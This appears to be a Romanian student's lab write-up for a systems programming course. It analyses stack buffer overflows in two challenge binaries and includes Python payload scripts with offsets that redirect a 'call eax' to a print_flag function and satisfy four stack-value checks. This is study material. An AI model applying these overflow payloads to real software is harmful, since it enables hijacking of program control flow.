# IOCLA Tema 3

## Exercitiul 1

O posibila vulnerabilitate este legata de buffer overflow. La adresa 0x8048663 din cod , unde se afla un "entry point" in functia "print_flag" (care are mai multe entry point-uri), se aloca spatiu pe stiva pentru a citi un string de la tastatura. Spatiul alocat pe stiva este mult mai mic decat cel ce poate fi citit de la tastatura. Putem folosi astfel un string mai mare pentru a genera un buffer overflow si sa alteram control flow-ul programului, deoarece, dupa citirea sirului de caractere, de pe stiva se incarca in $eax o adresa, unde va sari executia programului (call eax)

Provocand un buffer overflow, putem incarca o alta valoare in $eax, de pe stiva, si astfel, sa sarim cu executia programului la o adresa aleasa de noi.

Adresa entry point-ului : 0x8048663 (unde incep problemele)

## Exercitiul 2

In urma analizarii executabilului (cu ajutorul gdb si afl-fuzz) am determinat lungimea minima a unui string/payload ca fiind de 1118 caractere (1117 caractere se incadreaza in limite). Urmatoarele 4 caractere din payload sunt incarcate in registrul eax (ca pointer), si apoi executia programului sare la acel pointer. Am contruit payload-ul folosind urmatorul script python:

```python
import struct
pad = "\x41" * 1117
EIP = struct.pack("I", 0x080485b1);
print pad + EIP
```

Avem un padding de 1117 bytes, urmat de adresa la care vom sari, 0x080485b1, inceputul functiei print_flag.

## Exercitiul 3

La fel ca la primul binar, vulnerabilitatea este reprezentata de posibilitatea utilizarii unui buffer overflow pentru a suprascrie o "adresa de intoarcere" (se face un "call eax", dupa ce registrul $eax a primit o valoare de pe stiva).

Adresa entry point-ului : 0x08048682 (unde incep problemele)

Totusi, acea "adresa de intoarcere" nu este singura valoare ce trebuie suprascrisa pentru a face ce ne-am propus, deoarece exista 4 "teste" : se cauta valori pe stiva si se verifica daca sunt egale cu anumite valori hardcodate. Raspunsurile care trebuiesc date sunt, in ordine, urmatoarele: 
- 0x5b0aeb93
- 0x434a5c2c
- 0x08108164
- 0xabdc4f01
  
Folosind peda, am creat un pattern, pe care l-am folosit ca payload. Cand ajungeam la "teste", cautam in payload valoarea testata, pentru a-i afla pozitia.

- 0x5b0aeb93 - 229
- 0x434a5c2c - 470
- 0x08108164 - 648
- 0xabdc4f01 - 720

Am construit payloadul folosind urmatorul script python:
```python
import struct
test1 = "\x41" * 229
answer1 = struct.pack("I", 0x5b0aeb93);
test2 = "\x42" * 237
answer2 = struct.pack("I", 0x434a5c2c);
test3 = "\x43" * 174
answer3 = struct.pack("I", 0x08108164);
test4 = "\x44" * 68
answer4 = struct.pack("I", 0xabdc4f01);

pad = "\x41" * 447
EIP = struct.pack("I", 0x080485b1);
print test1 + answer1 + test2 + answer2 + test3 + answer3 + test4 + answer4 + pad + EIP
```
test* si pad - padding pentru valori
answer* si EIP - valorile care vrem sa le setam

Dimensiunile padding-urilor sunt calculate dupa formula:
```
size = loc_test_curr - loc_test_prev - 4

size = dimensiunea dorita
loc_test_curr = pozitia in input a "raspunsului" la testul curent
loc_test_prev = pozitia in input a "raspunsului" la testul anterior
4 = dimensiunea in bytes a raspunsului anterior

Pentru test 3 : 648 - 470 - 4 = 174
```

Folosind aceeasi metoda, am aflat locatia de unde se incarca valoarea registrului $eax, pentru care se face call (1171). De unde a rezultat dimensiunea 447 a padingului.

Adresa care vrem sa fie scrisa este 0x080485b1, inceputul functiei print_flag.